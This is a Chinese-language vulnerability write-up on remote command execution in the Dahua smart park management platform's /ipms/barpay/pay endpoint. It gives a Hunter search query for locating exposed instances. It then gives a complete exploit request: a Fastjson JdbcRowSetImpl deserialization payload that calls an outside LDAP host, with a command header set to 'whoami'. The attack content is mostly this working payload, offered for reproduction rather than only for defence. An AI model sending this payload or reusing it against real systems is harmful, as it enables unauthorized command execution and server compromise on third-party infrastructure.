# 大华智慧园区综合管理平台pay 远程命令执行

# 一、漏洞简介
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。大华智慧园区综合管理平台pay远程命令执行，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ hunter:`app.name="Dahua 大华 智慧园区管理平台"`  
![1691828229241-1a7a5e8c-d5e6-4852-b428-047c6c955113.png](./img/wn8K3RjMTMfb0sEx/1691828229241-1a7a5e8c-d5e6-4852-b428-047c6c955113-175675.png)
+ 登录页面：

![1691828319702-85171e4b-cb4b-4826-a654-3c8859b17138.png](./img/wn8K3RjMTMfb0sEx/1691828319702-85171e4b-cb4b-4826-a654-3c8859b17138-210923.png)

# 四、漏洞复现
```plain
POST /ipms/barpay/pay HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 127
Accept-Encoding: gzip, deflate
Cmd: whoami
Content-Type: application/json

{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://uh8aga.dnslog.cn", "autoCommit": true}
```

![1703413736105-efd77f3a-f2c3-430a-be05-31c15cd54cb7.png](./img/wn8K3RjMTMfb0sEx/1703413736105-efd77f3a-f2c3-430a-be05-31c15cd54cb7-325893.png)



> 更新: 2024-02-29 23:57:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dxg184gk73n2gyt8>